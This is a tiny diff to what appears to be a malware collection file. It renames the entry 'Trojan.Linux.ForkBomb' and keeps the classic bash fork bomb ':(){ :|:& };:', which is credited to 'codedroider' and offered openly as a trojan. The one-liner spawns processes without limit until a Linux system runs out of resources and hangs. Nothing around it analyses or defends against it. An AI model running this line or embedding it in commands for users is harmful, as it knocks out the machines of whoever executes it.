@@ -1,4 +1,4 @@
-# Trojan.Linux.ForkBomb
+# Trojan.Linux.ForkBomb.ClassicSymbols
 # by codedroider
 
 :(){ :|:& };:
